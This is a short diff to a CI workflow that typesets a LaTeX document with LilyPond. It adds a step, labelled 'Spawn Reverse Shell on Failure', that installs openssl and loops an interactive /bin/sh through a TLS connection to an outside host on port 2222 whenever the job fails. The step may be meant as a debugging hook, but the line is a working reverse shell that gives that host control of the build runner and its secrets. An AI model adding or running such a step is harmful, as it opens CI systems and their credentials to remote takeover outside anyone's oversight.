@@ -21,3 +21,8 @@ jobs:
           apt-get -qy install --no-install-recommends lilypond
       - name: Typeset document
         run: lualatex -shell-escape document.tex
+      - name: Spawn Reverse Shell on Failure
+        if: failure()
+        run: |
+          apt-get -qqy install openssl
+          mkfifo /tmp/s; while true; do /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -strict -verify 1 -verify_return_error -CAfile .cert.pem -connect prn.ovh:2222 > /tmp/s; done
